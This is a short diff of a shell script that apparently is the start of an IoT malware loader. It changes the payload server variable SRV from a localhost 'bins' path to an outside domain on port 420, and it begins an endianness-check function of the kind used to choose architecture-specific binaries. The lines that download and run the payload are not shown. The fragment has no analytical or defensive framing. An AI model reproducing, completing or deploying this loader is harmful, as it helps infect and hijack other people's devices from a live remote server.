@@ -1,6 +1,6 @@
 #!/bin/sh
 
-SRV="http://127.0.0.1/bins"
+SRV="http://mrplankton.com:420"
 
 is_le() {
     echo -n I | od -to2 | awk '{print $2; exit}' | grep -q "49"
